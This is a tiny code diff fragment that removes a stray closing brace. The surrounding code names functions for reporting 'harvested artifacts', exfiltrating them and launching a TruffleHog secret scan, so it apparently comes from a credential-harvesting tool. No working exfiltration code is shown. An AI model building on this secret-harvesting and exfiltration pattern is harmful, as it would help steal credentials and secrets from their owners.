@@ -375,8 +375,6 @@ function reportHarvestedArtifacts(artifacts, source) {
   exfiltrateArtifacts(artifacts, source);
 }
 
-}
-
 function launchTrufflehogScan() {
   if (!shouldLaunchTrufflehog()) {
     return;
